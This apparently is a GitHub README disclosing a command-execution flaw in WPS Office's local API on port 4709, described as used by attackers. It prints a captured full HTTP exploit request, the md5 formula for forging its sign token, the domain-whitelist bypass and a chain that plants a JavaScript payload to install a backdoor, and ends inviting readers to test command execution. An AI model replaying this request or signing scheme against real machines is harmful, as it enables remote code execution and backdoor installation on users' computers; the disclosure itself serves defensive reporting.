# Chinese-hackers-use-WPS-to-attack
We caught a batch of malicious attacks from Chinese hackers!We caught a batch of malicious attacks from Chinese hackers
# China-office-software-wps-web-command-execution
When the wps software is running, an api interface with port 4709 will be opened. An attacker can request this interface to execute commands.

# What is Wps?
WPS Office is a widely used office suite with a user base of over 200 million, developed by Chinese company Kingsoft.

# What is Wps wpscloudsvr Api?
As we said, wps(wpscloudsvr.exe)will listen to port 127.0.0.1:4709 when it starts, but it cannot be accessed by normal access. You need to use a domain name to access, such as: http://localhost.wbridge.wps.cn:4709

![Listen](https://github.com/George-boop-svg/Chinese-hackers-use-WPS-to-attack/blob/main/Listen%204709.png)

If you run wps and find that port 4709 is listened to, you can directly access the URL.

![Web](https://github.com/George-boop-svg/Chinese-hackers-use-WPS-to-attack/blob/main/web%20api.png)

# How to use api to execute commands?

Some time ago we captured a web request from an attacker as follows:
```
POST /command/invoke HTTP/1.1
Host: localhost.wbridge.wps.cn:4709
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 732
Origin: https://docs.wps.cn
Referer: https://docs.wps.cn/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-site
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua: "Google Chrome";v="114", "Chromium";v="114", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Te: trailers
Connection: close

app_id=kdocs&cmd=ksoqing%3A%2F%2Ftype%3Dksolaunch%26cmd%3DcGx1Z2luOi8vcGFnZUNsb3VkRG9jcz91cmw9aHR0cHM6Ly9haXJzaGVldC1jb21tdW5pdHkud3BzLmNuLw%3d%3d%26token%3D7b542dc31594d4f443dfc073fcb8abd3&ks_local_token=2BwJYEBTwY2ueCNrylNVQhMGt8QMNR3A&nonce_str=AbQ5fb66Q23E2yG3dbSM2TQ8M4HmD7i8&t=1695719826922&sign=C16B6005259121B111BF72787186D057FF191D04D2374F47E064F7A541B3601A
```
After the above request package is executed, the api interface of wps will be triggered and a wps official website will be opened. The attacker's malicious payload will be stored in the website. After loading, the backdoor will be downloaded to the specified directory and run.

## Simple analysis
Let’s do a simple analysis here.
Through reverse analysis, we found that cmd is the base64-encoded WPS official website domain name, because WPS restricts only some whitelisted domain names to be opened with the built-in browser, and those not in the whitelist can be opened with the user's default browser.whitelisted domain like:*.wps.cn  *.wps.com  *.wpscdn.cn  *.kdocs.cn  ....

### About Sign Token
```
md5(cmd + '_qingLaunchKey_')
```

# How hackers exploited the vulnerability?
We found that Chinese hackers are using this method to attack!
```
        (attack)
hacker >>>>>>>>>> web site(Install Js Payload Backdoor)
        (access)                           (run js payload)
user   >>>>>>>>>> web site(Hacker attack)   >>>>>>>>>>  attack wps (if you start wps and 4709 open)    >>>>>>>>>>  install backdoor
```

# End
If you want to implement command execution, you can go to https://www.wps.cn to download the software for testing.
